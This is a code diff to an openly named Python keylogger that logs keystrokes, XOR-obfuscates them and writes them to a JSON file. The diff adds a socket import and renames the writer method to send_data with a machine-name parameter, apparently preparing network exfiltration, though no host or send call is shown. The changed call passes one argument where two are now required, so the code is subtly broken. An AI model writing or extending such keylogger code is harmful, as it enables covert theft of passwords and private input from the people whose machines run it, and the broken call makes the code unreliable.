@@ -5,7 +5,7 @@ import pygetwindow as gw
 from abc import ABC, abstractmethod
 import json
 import threading
-
+import socket
 
 class IKeyLogger(ABC):
 
@@ -66,11 +66,11 @@ class KeyLoggerService(IKeyLogger):
 
 class IWriter:
     @abstractmethod
-    def write(self, data):
+    def send_data(self, data: dict, machine_name: str):
         pass
 
 class FileWriter(IWriter):
-    def write(self, data: dict):
+    def send_data(self, data: dict, machine_name: str):
         try:
             with open("log.json", "r") as file:
                 try:
@@ -130,7 +130,7 @@ class KeyLoggerManager:
                 data = self.service.get_logged_keys()
                 if data:
                     encrypted_data = self.encryptor.xor(data)
-                    self.writer.write(encrypted_data)
+                    self.writer.send_data(encrypted_data)
         except KeyboardInterrupt:
             print("\nStopping Keylogger...")
             self.service.stop_logging()
